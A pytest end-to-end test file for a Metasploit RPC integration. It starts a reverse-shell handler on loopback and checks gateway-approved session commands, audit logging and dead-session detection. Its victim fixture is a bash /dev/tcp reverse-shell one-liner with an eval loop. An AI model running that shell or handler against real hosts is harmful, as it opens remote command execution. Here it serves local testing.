"""Opt-in end-to-end tests for session interaction and death detection.

Gated behind ``NEXUS_E2E=1`` **and** ``MSF_RPC_PASSWORD`` with a reachable
``msfrpcd``. Nothing leaves loopback: the fixture starts an
``exploit/multi/handler`` listening on ``127.0.0.1`` and plays the victim with a
plain bash ``/dev/tcp`` one-liner executed on the same host. That exercises the
whole path — approval, ``nexus.session.interact``, ``session.shell_write`` /
``session.shell_read`` and the cleanup — without touching any external host.
"""

from __future__ import annotations

import asyncio
import os
import socket
from pathlib import Path
import time

from dotenv import load_dotenv
import pytest

from nexus_core.integrations.metasploit.client import (
    MetasploitClient,
    MetasploitConfig,
    MetasploitError,
    MetasploitUnavailable,
)
from nexus_core.tests.msf_support import context, gateway_with_approvals

ENABLED = os.getenv("NEXUS_E2E") == "1"
if ENABLED:
    load_dotenv(Path(__file__).resolve().parents[3] / ".env", override=False)

pytestmark = pytest.mark.skipif(
    not ENABLED or not os.getenv("MSF_RPC_PASSWORD"),
    reason="requires NEXUS_E2E=1 and MSF_RPC_PASSWORD",
)

INTERACT_TOOL = "nexus.session.interact"
HANDLER_MODULE = "exploit/multi/handler"
HANDLER_PAYLOAD = "linux/x64/shell_reverse_tcp"
LOOPBACK = "127.0.0.1"

#: ``AutoVerifySession`` makes the daemon run its own ``echo <token>`` handshake
#: right after the session opens. That handshake races with the operator's reads
#: (it swallows the first command's output), so the E2E disables it: the point is
#: to test our write/read path, not Metasploit's banner detection.
HANDLER_OPTIONS = {
    "PAYLOAD": HANDLER_PAYLOAD,
    "LHOST": LOOPBACK,
    "ExitOnSession": "false",
    "AutoVerifySession": "false",
}

#: The victim runs on the same host and only talks back through /dev/tcp.
VICTIM_SCRIPT = (
    "exec 3<>/dev/tcp/{host}/{port}\n"
    'while IFS= read -r line <&3; do eval "$line" >&3 2>&1; done\n'
)


@pytest.fixture(scope="module", autouse=True)
def live_daemon():
    async def check():
        async with MetasploitClient(MetasploitConfig.from_env()) as client:
            return await client.is_available()

    try:
        available = asyncio.run(check())
    except MetasploitUnavailable:
        pytest.skip("msfrpcd is not reachable")
    if not available:
        pytest.skip("msfrpcd does not respond to core.version")


def _free_port() -> int:
    with socket.socket() as probe:
        probe.bind((LOOPBACK, 0))
        return int(probe.getsockname()[1])


async def _spawn_victim(port: int) -> asyncio.subprocess.Process:
    return await asyncio.create_subprocess_exec(
        "/bin/bash",
        "-c",
        VICTIM_SCRIPT.format(host=LOOPBACK, port=port),
        stdin=asyncio.subprocess.DEVNULL,
        stdout=asyncio.subprocess.DEVNULL,
        stderr=asyncio.subprocess.DEVNULL,
    )


async def _session_for_port(
    client: MetasploitClient, port: int, known: set[str], timeout: float = 20.0
) -> str | None:
    """Wait for a brand-new session whose local tunnel is our handler port."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        for record in (await client.list_sessions()).values():
            if not isinstance(record, dict):
                continue
            uuid = str(record.get("uuid") or "")
            local = str(record.get("tunnel_local") or "")
            if uuid and uuid not in known and local.endswith(f":{port}"):
                return uuid
        await asyncio.sleep(0.5)
    return None


async def _open_session(client: MetasploitClient, port: int) -> tuple[int, str, object]:
    """Start the loopback handler and the victim; return ``(job_id, uuid, proc)``."""
    known = {
        str(record.get("uuid") or "")
        for record in (await client.list_sessions()).values()
        if isinstance(record, dict)
    }
    job = await client.execute_module(
        HANDLER_MODULE, {**HANDLER_OPTIONS, "LPORT": str(port)}
    )
    job_id = int(job["job_id"])
    # Give the handler a moment to bind before the victim connects.
    await asyncio.sleep(2)
    proc = await _spawn_victim(port)
    uuid = await _session_for_port(client, port, known)
    if not uuid:
        await _cleanup(client, job_id, proc=proc)
        pytest.fail("the loopback handler never opened a session")
    return job_id, uuid, proc


async def _await_no_job(
    client: MetasploitClient, job_id: int, timeout: float = 10.0
) -> None:
    """Best-effort wait until ``job.stop`` is reflected by ``job.list``."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            if str(job_id) not in await client._rpc("job.list", []):
                return
        except MetasploitError:
            return
        await asyncio.sleep(0.5)


async def _cleanup(
    client: MetasploitClient,
    job_id: int,
    *,
    uuid: str | None = None,
    proc: asyncio.subprocess.Process | None = None,
) -> None:
    """End the session and the handler, then reap the victim; tolerate anything gone."""
    if uuid:
        try:
            await client.stop_session(uuid)
        except MetasploitError:
            pass  # already gone: the victim died first
    try:
        await client.stop_job(job_id)
    except MetasploitError:
        pass
    else:
        await _await_no_job(client, job_id)
    if proc is not None and proc.returncode is None:
        proc.kill()
        await proc.wait()


async def _await_removal(
    client: MetasploitClient, uuid: str, timeout: float = 15.0
) -> bool:
    """True once the daemon stops listing the uuid.

    A shell session only notices a dead peer when something touches the socket,
    so the daemon keeps listing it until the next read/write fails.
    """
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if not await client.has_session(uuid):
            return True
        await asyncio.sleep(0.5)
    return False


def test_e2e_session_interact_against_local_shell(tmp_path):
    """A command routed through the gateway reaches the session and returns output."""
    port = _free_port()
    gw, audit, approvals, _store = gateway_with_approvals(tmp_path)
    run_context = context()
    approval = approvals.request(run_context, f"execute:tool:{INTERACT_TOOL}")
    approvals.decide(approval["id"], "system", "operator-e2e", True, "e2e approval")

    async def scenario():
        async with MetasploitClient(MetasploitConfig.from_env()) as client:
            job_id, uuid, proc = await _open_session(client, port)
            try:
                return (
                    await gw.invoke(
                        INTERACT_TOOL,
                        {
                            "session_uuid": uuid,
                            "command": "id",
                            "max_wait_seconds": 15,
                        },
                        run_context,
                        approval_id=approval["id"],
                    ),
                    uuid,
                )
            finally:
                await _cleanup(client, job_id, uuid=uuid, proc=proc)

    result, uuid = asyncio.run(scenario())

    assert result["verified"] is True
    assert result["output"]["status"] in {"ok", "timeout"}
    assert result["output"]["session_uuid"] == uuid
    assert result["output"]["command"] == "id"
    assert "uid=" in result["output"]["output"]
    assert result["evidence"]["output_bytes"] > 0
    # Every session command goes through the gateway, so it must be audited.
    events = audit.export("system")
    assert any(
        event["action"] == "tool.invoke" and event["resource_id"] == INTERACT_TOOL
        for event in events
    )


def test_e2e_session_death_detected(tmp_path):
    """Killing the victim makes the client report ``session_dead``, not a hang.

    The daemon keeps listing a shell session whose peer died (nothing polls the
    socket), so the detection rides on the first ``shell_write``/``shell_read``
    failing; afterwards the dead session is gone from ``session.list`` too.
    """
    port = _free_port()

    async def scenario():
        async with MetasploitClient(MetasploitConfig.from_env()) as client:
            job_id, uuid, proc = await _open_session(client, port)
            try:
                assert await client.has_session(uuid)
                proc.kill()
                await proc.wait()
                await asyncio.sleep(2)
                result = await client.run_in_session(
                    uuid, "id", max_wait_seconds=10, quiet_seconds=1.0
                )
                gone = await _await_removal(client, uuid)
                return result, gone
            finally:
                await _cleanup(client, job_id, uuid=uuid, proc=proc)

    result, gone = asyncio.run(scenario())

    assert result["status"] == "session_dead"
    assert result["output"] == ""
    assert result["bytes"] == 0
    assert gone, "the dead session is still listed by the daemon"
